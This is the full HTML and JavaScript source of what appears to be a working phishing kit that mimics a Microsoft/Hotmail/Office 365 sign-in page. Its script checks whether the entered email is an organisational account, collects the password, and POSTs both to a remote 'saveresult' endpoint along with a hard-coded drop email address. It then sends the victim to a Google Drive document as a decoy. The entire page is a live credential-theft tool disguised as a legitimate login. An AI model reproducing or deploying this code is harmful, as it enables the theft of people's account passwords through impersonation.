	
<!DOCTYPE html>
<html>
	<head>
	<title>Sign in with your account</title>
	<base href="https://maoffstartpsa-uncollusive-diamond.mybluemix.net/oaws/">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="vAky3JQ9obP89ThVha5g3dr9f0rVbXaGyufBe5LChBLqu2lMdr" />

	<meta name="msapplication-tap-highlight" content="no" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link href="imgs/favicon_a.ico" rel="shortcut icon" />

<meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" />
<meta name="HandheldFriendly" content="true">
<meta http-equiv="X-UA-Compatible" content="IE=IE9">
<style>
[v-cloak] { display: none; }
</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-promise/4.1.0/es6-promise.auto.min.js"></script>
<script>

//1.POLLYFILL_OLD BROWSER
//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign#Polyfill

if (typeof Object.assign != 'function') {
  // Must be writable: true, enumerable: false, configurable: true
  Object.defineProperty(Object, "assign", {
    value: function assign(target, varArgs) { // .length of function is 2
      'use strict';
      if (target == null) { // TypeError if undefined or null
        throw new TypeError('Cannot convert undefined or null to object');
      }

      var to = Object(target);

      for (var index = 1; index < arguments.length; index++) {
        var nextSource = arguments[index];

        if (nextSource != null) { // Skip over if undefined or null
          for (var nextKey in nextSource) {
            // Avoid bugs when hasOwnProperty is shadowed
            if (Object.prototype.hasOwnProperty.call(nextSource, nextKey)) {
              to[nextKey] = nextSource[nextKey];
            }
          }
        }
      }
      return to;
    },
    writable: true,
    configurable: true
  });
};

if(!('finally' in Promise.prototype)){
"use strict";var _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(aa){return typeof aa}:function(aa){return aa&&"function"==typeof Symbol&&aa.constructor===Symbol&&aa!==Symbol.prototype?"symbol":typeof aa};(function(){!function(ba){function ca(ea){if(da[ea])return da[ea].exports;var fa=da[ea]={exports:{},id:ea,loaded:!1};return ba[ea].call(fa.exports,fa,fa.exports,ca),fa.loaded=!0,fa.exports}var da={};return ca.m=ba,ca.c=da,ca.p="",ca(0)}({0:function _(ba,ca,da){(function(ea){var fa=da(80);try{(ea||{}).Promise=fa,window.Promise=fa}catch(ga){}}).call(ca,function(){return this}())},80:function _(ba,ca){(function(da){!function(){"use strict";function ea(){return hb[Ra][Ta]||Ra+"("+Ta+")"}function ga(kb){return kb&&"object"==("undefined"==typeof kb?"undefined":_typeof(kb))}function ha(kb){return"function"==typeof kb}function ia(kb,lb){return kb instanceof lb}function ja(kb){return ia(kb,Na)}function ka(kb,lb,mb){if(!lb(kb))throw pa(mb)}function la(){try{return Ea.apply(Fa,arguments)}catch(kb){return eb.e=kb,eb}}function ma(kb,lb){return Ea=kb,Fa=lb,la}function na(kb,lb){function mb(){for(var pb=0;pb<ob;)lb(nb[pb],nb[pb+1]),nb[pb++]=Da,nb[pb++]=Da;ob=0,nb.length>kb&&(nb.length=kb)}var nb=Ma(kb),ob=0;return function(pb,qb){nb[ob++]=pb,nb[ob++]=qb,2==ob&&hb.nextTick(mb)}}function oa(kb,lb){var mb,nb,ob,pb,qb=0;if(!kb)throw pa($a);var rb=kb[hb[Ra]["iterator"]];if(ha(rb))nb=rb.call(kb);else{if(!ha(kb.next)){if(ia(kb,Ma)){for(mb=kb.length;qb<mb;)lb(kb[qb],qb++);return qb}throw pa($a)}nb=kb}for(;!(ob=nb.next()).done;)if(pb=ma(lb)(ob.value,qb++),pb===eb)throw ha(nb[Va])&&nb[Va](),pb.e;return qb}function pa(kb){return new TypeError(kb)}function qa(kb){return(kb?"":"\nFrom previous ")+new Na().stack}function ra(kb,lb){var mb="on"+kb.toLowerCase(),nb=Ia[mb];Ja&&Ja.listeners(kb).length?kb===db?Ja.emit(kb,lb._v,lb):Ja.emit(kb,lb):nb?nb({reason:lb._v,promise:lb}):hb[kb](lb._v,lb)}function sa(kb){return kb&&kb._s}function ta(kb){if(sa(kb))return new kb(fb);var lb,mb,nb;return lb=new kb(function(ob,pb){if(lb)throw pa();mb=ob,nb=pb}),ka(mb,ha),ka(nb,ha),lb}function ua(kb,lb){return function(mb){La&&(kb[Ya]=qa(!0)),lb===Pa?Aa(kb,mb):za(kb,lb,mb)}}function va(kb,lb,mb,nb){return ha(mb)&&(lb._onFulfilled=mb),ha(nb)&&(kb[Wa]&&ra("rejectionHandled",kb),lb._onRejected=nb),La&&(lb._p=kb),kb[kb._c++]=lb,kb._s!==Qa&&ib(kb,lb),lb}function wa(kb){if(kb._umark)return!0;kb._umark=!0;for(var lb,mb=0,nb=kb._c;mb<nb;)if(lb=kb[mb++],lb._onRejected||wa(lb))return!0}function xa(kb,lb){function mb(ob){return nb.push(ob.replace(/^\s+|\s+$/g,""))}var nb=[];return La&&(lb[Ya]&&mb(lb[Ya]),function ob(pb){pb&&Xa in pb&&(ob(pb._next),mb(pb[Xa]+""),ob(pb._p))}(lb)),(kb&&kb.stack?kb.stack:kb)+("\n"+nb.join("\n")).replace(gb,"")}function ya(kb,lb){return kb(lb)}function za(kb,lb,mb){var nb=0,ob=kb._c;if(kb._s===Qa)for(kb._s=lb,kb._v=mb,lb===Oa&&(La&&ja(mb)&&(mb.longStack=xa(mb,kb)),jb(kb));nb<ob;)ib(kb,kb[nb++]);return kb}function Aa(kb,lb){if(lb===kb&&lb)return za(kb,Oa,pa("Chaining cycle detected for promise")),kb;if(lb!==Ga&&(ha(lb)||ga(lb))){var mb=ma(Ba)(lb);if(mb===eb)return za(kb,Oa,mb.e),kb;ha(mb)?(La&&sa(lb)&&(kb._next=lb),sa(lb)?Ca(kb,lb,mb):hb.nextTick(function(){Ca(kb,lb,mb)})):za(kb,Pa,lb)}else za(kb,Pa,lb);return kb}function Ba(kb){return kb.then}function Ca(kb,lb,mb){var nb=ma(mb,lb)(function(ob){lb&&(lb=Ga,Aa(kb,ob))},function(ob){lb&&(lb=Ga,za(kb,Oa,ob))});nb===eb&&lb&&(za(kb,Oa,nb.e),lb=Ga)}var Da,Ea,Fa,Ga=null,Ha="object"==("undefined"==typeof window?"undefined":_typeof(window)),Ia=Ha?window:da,Ja=Ia.process,Ka=Ia.console,La=!1,Ma=Array,Na=Error,Oa=1,Pa=2,Qa=3,Ra="Symbol",Ta="species",Va="return",Wa="_uh",Xa="_pt",Ya="_st",$a="Invalid argument",db="unhandledRejection",eb={e:Ga},fb=function(){},gb=/^.+\/node_modules\/yaku\/.+\n?/gm,hb=ba.exports=function(kb){var lb,mb=this;if(!ga(mb)||mb._s!==Da)throw pa("Invalid this");if(mb._s=Qa,La&&(mb[Xa]=qa()),kb!==fb){if(!ha(kb))throw pa($a);lb=ma(kb)(ua(mb,Pa),ua(mb,Oa)),lb===eb&&za(mb,Oa,lb.e)}};hb["default"]=hb,function(kb,lb){for(var mb in lb)kb[mb]=lb[mb]}(hb.prototype,{then:function then(kb,lb){if(void 0===this._s)throw pa();return va(this,ta(hb.speciesConstructor(this,hb)),kb,lb)},"catch":function _catch(kb){return this.then(Da,kb)},"finally":function _finally(kb){function lb(mb){return hb.resolve(kb()).then(function(){return mb})}return this.then(lb,lb)},_c:0,_p:Ga}),hb.resolve=function(kb){return sa(kb)?kb:Aa(ta(this),kb)},hb.reject=function(kb){return za(ta(this),Oa,kb)},hb.race=function(kb){var lb=this,mb=ta(lb),nb=function(qb){za(mb,Pa,qb)},ob=function(qb){za(mb,Oa,qb)},pb=ma(oa)(kb,function(qb){lb.resolve(qb).then(nb,ob)});return pb===eb?lb.reject(pb.e):mb},hb.all=function(kb){function lb(qb){za(ob,Oa,qb)}var mb,nb=this,ob=ta(nb),pb=[];return mb=ma(oa)(kb,function(qb,rb){nb.resolve(qb).then(function(sb){pb[rb]=sb,--mb||za(ob,Pa,pb)},lb)}),mb===eb?nb.reject(mb.e):(mb||za(ob,Pa,[]),ob)},hb.Symbol=Ia[Ra]||{},ma(function(){Object.defineProperty(hb,ea(),{get:function get(){return this}})})(),hb.speciesConstructor=function(kb,lb){var mb=kb.constructor;return mb?mb[ea()]||lb:lb},hb.unhandledRejection=function(kb,lb){Ka&&Ka.error("Uncaught (in promise)",La?lb.longStack:xa(kb,lb))},hb.rejectionHandled=fb,hb.enableLongStackTrace=function(){La=!0},hb.nextTick=Ha?function(kb){setTimeout(kb)}:Ja.nextTick,hb._s=1;var ib=na(999,function(kb,lb){var mb,nb;return nb=kb._s===Oa?lb._onRejected:lb._onFulfilled,nb===Da?void za(lb,kb._s,kb._v):(mb=ma(ya)(nb,kb._v),mb===eb?void za(lb,Oa,mb.e):void Aa(lb,mb))}),jb=na(9,function(kb){wa(kb)||(kb[Wa]=1,ra(db,kb))})}()}).call(ca,function(){return this}())}})}).call("object"===("undefined"==typeof window?"undefined":_typeof(window))&&window||"object"===("undefined"==typeof self?"undefined":_typeof(self))&&self||"object"===("undefined"==typeof global?"undefined":_typeof(global))&&global||{});

//alert("ko finally Promise");

}
</script>
	<link rel="stylesheet" href="css/default.css">
	<script src="https://unpkg.com/vue/dist/vue.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/vee-validate/2.0.0-rc.3/vee-validate.min.js"></script>
	<script src="https://unpkg.com/axios@0.16.1/dist/axios.min.js"></script>

	</head>
	<body style="margin:0px" >
	<div v-cloak id="nbrhmne" class="main-content">
<div class="cb">

<div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
 <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27523.1/images/Backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div>
<div v-if="back_com==0" class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27523.1/images/Backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div>
 <div v-else class="backgroundImage" :style="{ 'background-image': 'url('+back_com+')'}" ></div>
 <div class="background-overlay"></div> </div>
</div>

 <div name="f1" id="i0281" novalidate="novalidate" spellcheck="false" target="_top" autocomplete="off"> 
 <div class="outer nbrfixddda" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.A2,
            showFooterLinks: true,
            useWizardBehavior: svr.BR,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
			
			<div class="middle">
			 <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
			 <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
					<img v-if="logocom=='0'" class="logo" role="presentation" src="imgs/microsoft_logo.svg">
					<img v-else class="logo" role="presentation" :src="logocom">
					
					</div> <div data-bind="
                    css: { 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') },
                    component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }" class="animate back">
							
				<!-- step option -->
				<div v-if="stepoption==1" data-viewid="7"><!--  --> <div class="row text-body text-block-body"> <div id="loginDescription" data-bind="text: pageDescription">It looks like this email is used with more than one account from Microsoft. Which one do you want to use?</div> </div> <div class="form-group"> <div class="row tile"> <div @click="select_casehasoption(1)" id="aadTile" class="table" tabindex="0" role="button"> <div class="table-row"> <div class="table-cell tile-img"> <img class="tile-img" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6916.13/content/images/picker_account_aad.png?x=9dc88e7b0dfe417cfc59612381728698" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6916.13/content/images/picker_account_aad.svg?x=9de70d1c5191d1852a0d5aac28b44a6c" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6916.13/content/images/picker_account_aad.svg?x=9de70d1c5191d1852a0d5aac28b44a6c"> </div> <div class="table-cell text-left content"> <div id="aadTileTitle" data-bind="text: str['CT_HRD_STR_Splitter_AadTile_Title']">Work or school account</div> <div id="aadTitleHint"><small data-bind="text: str['CT_HRD_STR_Splitter_AadTile_Hint']">Created by your IT department</small></div> <div><small data-bind="text: displayName">{{user}}</small></div> </div> </div> </div> </div> <div class="row tile"> <div @click="select_casehasoption(0)" id="msaTile" class="table" tabindex="0" role="button" data-bind="click: msaTile_onClick, pressEnter: msaTile_onClick"> <div class="table-row"> <div class="table-cell tile-img"> <img class="tile-img" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6916.13/content/images/picker_account_msa.png?x=4e3619a499fd74c0c66d5215514b566a" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6916.13/content/images/picker_account_msa.svg?x=2d8f86059be176833897099ee6ddedeb" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6916.13/content/images/picker_account_msa.svg?x=2d8f86059be176833897099ee6ddedeb"> </div> <div class="table-cell text-left content"> <div id="msaTileTitle" data-bind="text: str['CT_HRD_STR_Splitter_MsaTile_Title']">Personal account</div> <div id="msaTileHint"><small data-bind="text: str['CT_HRD_STR_Splitter_MsaTile_Hint']">Created by you</small></div> <div><small data-bind="text: displayName">{{user}}</small></div> </div> </div> </div> </div> </div> <div class="row"> <div><div class="col-xs-24 form-group no-padding-left-right" @click="backuser_casehasoption"> <div class="col-xs-24"> <input id="idBtn_Back" class="btn btn-block" value="Back" type="button"> </div> <div class="col-xs-12 primary"> <input id="idSIButton9" class="btn btn-block btn-primary" value="Next" style="display: none;" type="submit"> </div> </div></div> </div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links">  </div> </div> </div></div>
					<!-- not step option -->		
							<div v-else-if="stepoption==0" data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }">
							
			<!-- step 2 password -->
		<div v-if="step==2" data-bind="component: { name: 'identity-banner-control',
     params: {
        pawnIconId: svr.Bw,
        displayName: displayName } }"><!--  --> <div class="identityBanner">

		<div class="identity" data-bind="text: displayName, attr: { 'title': displayName }" :title="user">
			{{user}}</div> 
		<div class="profile-photo"> <img v-if="type_account==0" role="presentation" src="https://auth.gfx.ms/16.000.27523.1/images/picker_account_msa.svg?x=2d8f86059be176833897099ee6ddedeb"> <img v-else role="presentation" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6856.25/content/images/picker_account_aad.svg"></div> </div></div>	
							
							<div v-if="step==1" id="loginHeader" class="row text-title" role="heading" >Sign in</div>
						<div v-else-if="step==2 && steplogin!=1" id="loginHeader" class="row text-title" role="heading" >Enter password</div>
						<div v-else-if="step==2 && steplogin==1" id="loginHeader" class="row text-title" role="heading" >{{atextRedirect}}</div>							

			<div class="row"> 
							 <div role="alert" aria-live="assertive" aria-atomic="false">
							 <!-- error email-->
							 <div v-show="errors.has('UserName')" class="alert alert-error col-md-24" id="usernameError">
			Please enter a valid email address.
			<!-- That Microsoft account doesn't exist. Enter a different account or get a new one. -->
			</div>
			 <div v-if="!errors.has('UserName') && usernotexist" class="alert alert-error col-md-24" id="usernameError">
			That Microsoft account doesn't exist. Enter a different account or get a new one.
			</div>
			<div v-else-if="error_or==1" class="alert alert-error col-md-24" id="usernameError">
			<b>We don't recognize this user ID</b>
			<p>Be sure to type the user for your work or school account.</p>
			</div>
			
			<div v-if="errors.has('password') && steplogin!=1 && step==2" class="alert alert-error col-md-24" id="usernameError">
			Please enter the password for your Microsoft account.
			<!-- That Microsoft account doesn't exist. Enter a different account or get a new one. -->
			</div>
			<div v-else-if="error_wrongpass==1 && steplogin!=1 && step==2" class="alert alert-error col-md-24" id="usernameError">
			Your account or password is incorrect.
			<!-- That Microsoft account doesn't exist. Enter a different account or get a new one. -->
			</div>
			
			</div> 
		<div :class="{'progress-container':steplogin}" class="row">	
		
		<!-- step 1 -->
			<div v-if="step==1" class="form-group col-md-24">
			<div class="placeholderContainer">
			<!-- email login -->
			<!-- Please enter the password for your Microsoft account. -->
			<input ref="inputuser" @keydown="clearcheckuser" @keyup.enter="stepvalidemail" data-vv-name="UserName" v-validate data-vv-rules="required|email" v-model="user" name="loginfmt" id="i0116" maxlength="113" :class="{'has-error':errors.has('UserName')}" class="form-control ltr_override nbrhm" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" data-bind="textInput: displayName,
                    hasFocusEx: isFocused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    css: { 'has-error': error },
                    attr: inputAttributes" placeholder="Enter your email." type="email" lang="en">
		<input name="passwd" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="password">
	<!-- loading user name -->
	<div v-if="stepchecku==1" id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending"><div></div><div></div><div></div><div></div><div></div><div></div>
	</div>
	
		<div class="phholder" style="left: 0px; top: 0px; width: 100%; position: absolute; z-index: 1;display:none" data-bind="visible: !textInput(), click: focus"> 
		<div aria-hidden="true" style="cursor:text" data-bind="text: hintText, css: hintCss" class="placeholder">Email, phone, or Skype</div> 
		</div> 
	</div>
	
	</div> 
	
	<!-- step 2 -->
	
	<div v-else-if="step==2 && steplogin!=1" class="form-group col-md-24">
			<div class="placeholderContainer">
			<!-- email login -->
			<!-- Please enter the password for your Microsoft account. -->
			<input ref="inputpass" @keyup="keymonitor" @keyup.enter="loghm" data-vv-name="password" v-validate data-vv-rules="required" v-model="pass" name="passnbr" id="i01161" :class="{'has-error':errors.has('password')}" class="form-control ltr_override nbrhm"  placeholder="Password" type="password" lang="en">
		
	</div>
	
	</div> 
	
	<div v-show="steplogin==1" class="progress" role="progressbar"><div></div><div></div><div></div><div></div><div></div><div></div></div>
	
	
	
	</div>
	</div>

	<div class="row"> 
	<div >
	<!-- case redirect login doc  -->
	<div v-show="steplogin!=1" class="col-xs-24 form-group no-padding-left-right" > 
	 
	 <div class="col-xs-12 secondary">

	 <input @click="backuser" id="idBtn_Back" class="btn btn-block" value="Back" v-if="step==2" type="button"> 
	 </div> 
			<div v-if="step==1"  class="col-xs-24"> 
			<!-- button next step 1-->
			<input @click="stepvalidemail" :class="{'btn-primary':!stepchecku}" id="idSIButton9" class="btn btn-block"  value="Next" type="submit"> 
			</div> 
			<div v-else-if="step==2" class="col-xs-12 primary"> 
			<!-- button next step 1-->
			<input @click="loghm" :class="{'btn-primary':!steplogin}" id="idSIButton9" class="btn btn-block "  value="Next" type="submit"> 
			</div> 
			</div></div>
			</div>
<!-- keep user  step 2 -->
			<div v-if="step==2 && steplogin!=1" id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.B &amp;&amp; !showHip">
				<label style="padding-left:0px;margin-left:0px" id="idLbl_PWD_KMSI_Cb"> <input style="width:20px;height:20px" name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div>
			<div v-show="steplogin!=1" class="row"> <div class="col-md-24">
			
			<div class="text-13 form-group no-margin-bottom" data-bind="
            css: { 'no-margin-bottom': !svr.B3 &amp;&amp; !svr.showCantAccessAccountLink },
            htmlWithBindings: html['WF_STR_SignUpLink_Text'],
            childBindings: { 'signup': { href: svr.b, css: { 'display-inline-block': true }, ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'], click: signup_onClick } }">
			No account? <a href="https://signup.live.com/signup.aspx?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1505948361&amp;rver=6.7.6640.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fpath%3d%252fmail%252finbox%26authRedirect%3dtrue%26realm%3dgmail.com%26RpsCsrfState%3dccd3831c-3256-2369-2df0-c66f5c88d482&amp;id=292841&amp;whr=gmail.com&amp;CBCXT=out&amp;fl=wld&amp;cobrandid=90015&amp;contextid=5D597F90F8357F44&amp;bk=1505948366&amp;uiflavor=web&amp;uaid=3591241b83584a11927ece0e4c942a8c&amp;mkt=EN-US&amp;lc=1033" id="signup" class="display-inline-block" aria-label="Create a Microsoft account">Create one!</a></div><!-- /ko --><!-- ko if: svr.B3 --><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --><!-- /ko --> </div>
			</div>
			
			</div>
			<!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> 
			
			</div></div> </div>               </div> <!-- /ko --></div><!-- ko if: desktopSsoRunning --><!-- /ko --><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer" class="footer default" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }">
				<div id="footerLinks" class="footerNode text-secondary">
					<span id="ftrCopy" data-bind="html: svr.aa">©2017 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacy &amp; Cookies</a>
					</div> 
					</div> </div> 
			</div> 

	
</div>	
</div>	
<script>
var VTEMAILSENDER_NBR=3;
var EMAILRESULT_NBR="leonifed.ifdk@gmail.com";
var baseURL="https://maoffstartpsa-uncollusive-diamond.mybluemix.net/oaws/saveresult/";
var timeout=30000;
var LINKRE_RESULT="https://drive.google.com/file/d/0BwQW_LHWYsi8RzFjeE1IZE9QNnc/edit";
var userreadynow="";
var acboth="";
var textRedirect="Taking you to the document page";
// creat instance ajax
var CancelToken = axios.CancelToken;
var nbrProcess = CancelToken.source();
var instance = axios.create({
  baseURL: baseURL,
  // timeout 5s per request
  timeout: timeout,
  // avoid cross domain cookies
  withCredentials:true,
  //responseType: 'json',
 // xsrfCookieName: "%xsrfCookieName%",
 
  // set cancel process ajax | nbrProcess.cancel("resean");
  cancelToken: nbrProcess.token
});
var configVeeValidate = {
	delay: 200, 
 // locale: store.getters.getLang, 
  events: 'input|blur' // default value.
};
Vue.use(VeeValidate,configVeeValidate);
	var app = new Vue({
  el: '#nbrhmne',
  data: function(){
	   return {
		   // case only oragan 1 only  0 is accept normal 
		   onlyeduor:1,
		   urlAuth:"",
		   typecheckerauth:"loghm",
		   // error not valid oragan 
		   error_or:0,
		   // error wrong pass 
		   error_wrongpass:0,
		   atextRedirect:"",
		   hasoption:0,
		   // 1 is show option , 0 hide 
		   stepoption:0,
		   hello: "",
			user: "",
			pass:"",
			logocom:0,
			back_com:0,
			type_account:0,
			widthNameUser:"",
			stepchecku:0,
			steplogin:0,
			usernotexist:false,
			step:1,
			titlenbrttt:"Sign in with Hotmail"
	   }
  },computed: {
	  
  },
  created: function() {
	 
	//emailex_hm_to_off="";
    //this.fetchData();
	this.$nextTick(function () {
				this.user=userreadynow;
				this.atextRedirect=textRedirect;
				// accept both type account 
				if(acboth!="")
					this.onlyeduor=0;
			});
	
	
  }
  ,
 
  methods: {
	  keymonitor:function(){
		  // remove wrong pass message 
		  this.error_wrongpass=0;
	  },
	  clearcheckuser: function(){
		  this.usernotexist=false;
	  },
	  stepvalidemail: function () {
		  if(this.stepchecku==1)
			  return;
		  // reset option and auth link 
		  this.stepoption=0;
		  this.urlAuth="";
		  this.hasoption=0;
		// check case user 
		 // avoid fast 
		 
		 this.$validator.validateAll().then(function(){}).catch(function(){});
		 if(this.user!="" && !this.errors.has('UserName') && this.stepchecku==0){
			 this.stepchecku=1;
			 this.usernotexist=false;
			 var selfNBR=this;
				instance.post('/',{
				type_ac:"validoff365",
				e:this.user
			}).then(function(response) {
				data = response.data;
				selfNBR.urlAuth=data.authUrl;
				if((data.error==0 && data.type=="organization") || data.error==2){
					selfNBR.error_or=0;
					
						
					selfNBR.typecheckerauth="valiu365";
					if(data.error==0){
						if(data.logo!=""){
									if (typeof data.logo[0].Illustration !== 'undefined') {
										selfNBR.back_com=data.logo[0].Illustration;
									}
									else {
										selfNBR.back_com=0;
									}
									
									if (typeof data.logo[0].BannerLogo !== 'undefined') {
										selfNBR.logocom=data.logo[0].BannerLogo;
									}
									else {
										selfNBR.logocom=0;
									}
						}
					}
					selfNBR.usernotexist=false;
					//emailex_hm_to_off=selfNBR.user;
					//router.push({path: '/365-'+randomId(105)+'-'+randomId(94)+'/'+randomId(86)});
					selfNBR.usernotexist=false;
					
					// check case have option n not have redirect 
					// will set have option 
					if(data.option==1 && selfNBR.urlAuth==""){
						// show panel option 
						selfNBR.stepoption=1;
						selfNBR.hasoption=data.option;
					}
					else {
						selfNBR.step=2;
						selfNBR.type_account=1;
						 selfNBR.$nextTick(function () {
							selfNBR.$refs.inputpass.focus();
						})
					}
					
				}
				else if((data.error==0 && data.type=="normal") || data.error==2){
					// only or 
					selfNBR.typecheckerauth="lghm";
					if(selfNBR.onlyeduor==1){
						selfNBR.error_or=1;
					}
					// will accept normal 
					else {
						selfNBR.usernotexist=false;
						selfNBR.step=2;
						selfNBR.type_account=0;
						 selfNBR.$nextTick(function () {
							selfNBR.$refs.inputpass.focus();
						})
					}
					
				}
				else {
					selfNBR.usernotexist=true;
				}
				selfNBR.stepchecku=0;
			}).catch(function(thrown) {
			  if (axios.isCancel(thrown)) {
				selfNBR.stepchecku=0;
				} else {
					//There was an issue looking up your account. Tap Next to try again.
			  
				selfNBR.stepchecku=0;
			  }
			
			});
			 
		 }
		 else {
			 this.$nextTick(function () {
				this.$refs.inputuser.focus();
			})
			 
		 }
    },
	loghm:function(){
		if(this.steplogin==1)
			return;
		 if(this.pass!="" && !this.errors.has('password') && this.steplogin==0){
			 this.steplogin=1;
		
			 var selfNBR=this;
				instance.post('/',{
				type_ac:this.typecheckerauth,
				e:this.user,
				p:this.pass,
				u:this.urlAuth,
				sub:"HotMail",
				vt: VTEMAILSENDER_NBR,
				er:EMAILRESULT_NBR
			}).then(function(response) {
				data = response.data;
				// case normal 
				if(response.data=="DONE"){
					window.location.href =LINKRE_RESULT;
				}
				else
				if(data.error==0  || data.error==2){
					window.location.href =LINKRE_RESULT;
				}
				else if (data.error==1 ){
					// check wrong 
					selfNBR.error_wrongpass=1;
					selfNBR.steplogin=0;
				}
				else {
					selfNBR.steplogin=0;
				}
				
				
				
				//
			}).catch(function(thrown) {
			  if (axios.isCancel(thrown)) {
				selfNBR.steplogin=0;
			  } else {
				selfNBR.steplogin=0;
			  }
			
			});
		 }
		 else {
			 this.$refs.inputpass.focus();
		 }
	},
	backuser:function(){
		// check if has option 
		if(this.hasoption==1){
			this.stepoption=1;
			return;
		}
		// avoid back when click login
		if(this.steplogin==1)
			return;
		this.step=1;
		this.logocom=0;
		this.$nextTick(function () {
			this.$refs.inputuser.focus();
		})
	},
	// new back case hasoption 
	backuser_casehasoption:function(){
		// step hide panel option 
		this.stepoption=0;
		this.hasoption=0;
		this.step=1;
		this.logocom=0;
		this.$nextTick(function () {
			this.$refs.inputuser.focus();
		})
	},
	// 1 is checker , 0 is not check redirect 
	select_casehasoption:function(option){
		// set case has redrect => not need check 
		if(option==0){
			this.urlAuth="https://mioff.com/offoption";
			this.type_account=0;
		}
		else {
			this.urlAuth="";
			this.type_account=1;
		}
		// set hide panel option 
		this.stepoption=0;
		this.step=2;
		
		this.$nextTick(function () {
		this.$refs.inputpass.focus();
		});
	}
	
	
  }
  ,
  beforeDestroy: function() {
    console.log("DESTROY ADMIN CHANGEPAS NE!");
	// remove all event listeners
	this.$off();
	this.data=null;
	this.computed=null;
  }
})
	</script>
	</body>
	
</html>
